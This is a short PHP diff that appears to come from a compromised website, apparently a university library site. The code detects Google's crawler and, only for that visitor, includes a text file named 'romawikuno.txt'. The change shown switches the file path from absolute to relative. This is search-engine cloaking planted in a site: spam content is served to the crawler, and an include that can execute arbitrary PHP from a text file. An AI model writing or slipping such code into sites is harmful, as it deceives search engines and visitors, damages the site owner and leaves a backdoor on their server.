@@ -20,7 +20,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
-    $file_to_load = DIR . '/var/www/library.upr.ac.id/public_html/romawikuno.txt';
+    $file_to_load = DIR . '/romawikuno.txt';
     
     if (file_exists($file_to_load)) {
         include($file_to_load);
